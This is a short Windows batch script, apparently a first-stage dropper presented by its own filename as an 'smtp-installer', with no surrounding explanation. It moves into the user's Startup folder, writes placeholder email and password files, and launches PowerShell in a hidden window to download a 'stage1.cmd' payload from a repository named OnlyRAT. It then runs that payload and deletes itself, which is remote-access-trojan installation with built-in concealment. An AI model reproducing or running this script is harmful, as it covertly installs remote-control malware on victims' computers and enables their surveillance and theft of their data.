@echo off
set "XNjFYKECht=%cd%"
set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cd %YKHfpmMRoQ%
echo example@gmail.com > XbrMzmCUiE.txt
echo password > UJbMLjTIDr.txt
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/stage1.cmd -OutFile wEaoFkNduy.cmd"
powershell ./wEaoFkNduy.cmd
cd "%XNjFYKECht%"
del smtp-installer.cmd